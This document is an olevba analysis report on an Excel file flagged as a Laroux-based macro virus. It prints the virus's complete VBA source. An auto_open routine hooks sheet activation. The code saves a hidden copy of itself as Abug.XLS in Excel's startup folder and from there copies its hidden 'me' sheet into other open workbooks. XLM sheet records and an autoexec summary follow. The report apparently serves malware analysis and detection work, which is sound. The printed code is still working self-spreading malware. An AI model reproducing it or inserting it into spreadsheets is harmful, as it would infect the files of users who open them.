olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-96120a2aefcda56dd5feea2acf90ab80e83da020
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO me.bas 
in file: Virus.MSExcel.Laroux-based-96120a2aefcda56dd5feea2acf90ab80e83da020 - OLE stream: '_VBA_PROJECT_CUR/VBA/me'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'For example

Sub examme()
Attribute examme.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "Abug.XLS")
    If UCase(m$) = "ABUG.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    ExcelUser = p + w * 10
    If ExcelUser = 10 Then
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("me").Visible = True
    Sheets("me").Select
    Sheets("me").Copy
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "Abug.XLS"
    ChDir c4$
    Workbooks(n4$).Sheets("me").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "Abug.xls!exam"
    End If
    If ExcelUser = 1 Then
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "me" Then
    Workbooks("Abug.XLS").Sheets("me").Copy before:=Workbooks(n4$).Sheets(1)
    Workbooks(n4$).Sheets("me").Visible = False
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "Abug.xls!exam"
    End If
    End Sub
    Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "examme"
End Sub

Sub exam()
Attribute exam.VB_ProcData.VB_Invoke_Func = " \n14"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     10 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  m
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

